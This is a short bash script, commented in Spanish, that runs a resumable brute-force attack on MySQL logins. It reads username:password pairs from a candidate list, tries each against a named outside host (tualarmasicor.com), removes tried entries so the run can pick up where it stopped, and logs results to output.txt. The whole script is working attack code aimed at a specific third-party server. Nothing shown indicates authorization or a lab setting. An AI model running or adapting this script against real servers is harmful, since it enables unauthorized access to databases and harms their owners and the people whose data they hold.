echo '[+] Preparando lista de candidatos.'

if [ -s "candidates.txt" ];then

	echo '[+] Continuando con el ataque de fuerza bruta...'

else

	cp bruteforce.txt candidates.txt
	echo '[+] Comenzando ataque de fuerza bruta.'

fi


echo '[!] Guardando datos en output.txt.'

progress=''
touch output.txt
bash -c "tail -100f output.txt"& #Con esta línea va actualizando el estado del output.txt para mostrar los hallazgos y el progreso.

for name in $(cat candidates.txt);do
	username=$(echo $name | cut -d ':' -f1)
	password=$(echo $name | cut -d ':' -f2)
	sed -i '1d' candidates.txt #Modificamos la lista para eliminar el candidato probado de esa forma, si el ataque de fuerza bruta se bloquea en algun momento y tenemos que volver a lanzarlo no tenemos que volver a realizar las requests ya probadas. En último término podemos volver a descargar la lista de candidatos que hemos utilizado.
	#echo $username
	#echo $password

	if [ -z $password ];then

		bash -c "mysql -h tualarmasicor.com -u $username" 2>> output.txt #Como estamos ejecutando esto a través de un script, utilizamos 'bash -c' para poder gestionar correctamente el stderror y el stout del proceso.
	
	else

		bash -c "mysql -h tualarmasicor.com -u $username -p$password" 2>> output.txt
	
	fi
	
done

echo '[+] Finalizado el ataque de fuerza bruta'

#Este script intenta realizar un ataque de fuerza bruta y está preparado para que si ocurre una interrupción, pueda volver a ser lanzado desde el punto en el que se quedó, ya que añade los resultados al final de la lista y borra los candidatos probados de la lista de credenciales proporcionada.